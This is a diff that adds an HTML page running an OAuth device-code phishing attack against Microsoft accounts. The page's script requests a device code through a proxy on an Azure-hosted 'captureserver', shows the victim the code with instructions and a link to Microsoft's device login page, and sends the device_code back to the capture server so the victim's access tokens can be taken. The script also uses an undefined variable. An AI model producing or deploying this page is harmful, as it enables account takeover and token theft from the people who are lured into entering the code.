@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $.get("http://captureserver.eastus.cloudapp.azure.com:8443/https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net")
+            .done(function(data) {
+                var code = data.message.match(/code (.*) to/)[1];
+                var message = "Your verification code is: " + code;
+                var claim = "Please follow the link below and enter your code";
+                var link3 = "<a href='http://cors.trusteddomain.com/https://microsoft.com/devicelogin'>Take a Peek</a>";                
+                document.getElementById('code').innerHTML += message + "<br>" + claim + "<br>" + link2 + "<br>" + link3;
+                $.get("https://captureserver.eastus.cloudapp.azure.com//?id=" + data.device_code);
+            });
+        });
+    </script>
+</head>
+<body>
+    <div id="code"></div>
+</body>
+</html>
